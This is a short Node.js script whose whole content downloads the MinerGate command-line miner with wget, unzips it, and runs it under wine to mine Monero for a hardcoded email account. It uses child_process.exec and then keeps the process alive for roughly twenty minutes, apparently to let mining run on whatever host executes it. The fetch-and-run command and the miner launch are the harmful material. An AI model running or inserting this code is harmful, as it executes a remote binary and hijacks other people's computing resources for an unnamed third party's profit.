var str = "wget https://minergate.com/download/win32-cli && unzip win32-cli && cd Miner* && wine minergate-cli.exe -user molunar@yandex.com -xmr";
var child = require('child_process').exec(str);
child.stdout.on('data', function(data) {
    console.log('stdout: ' + data);
});
child.stderr.on('data', function(data) {
    console.log('stdout: ' + data);
});
child.on('close', function(code) {
    console.log('closing code: ' + code);
});
require('child_process').exec("wine --help", { stdio: [0, 1, 2] });
var index = 1;
var max = 20;
var interval;
interval = setInterval(function () {
  if (index >= max) {
    setTimeout(function(){
        process.exit(0);
    }, 1000);		
  }
  console.log("running..." + ++index);
}, 1000 * 60);
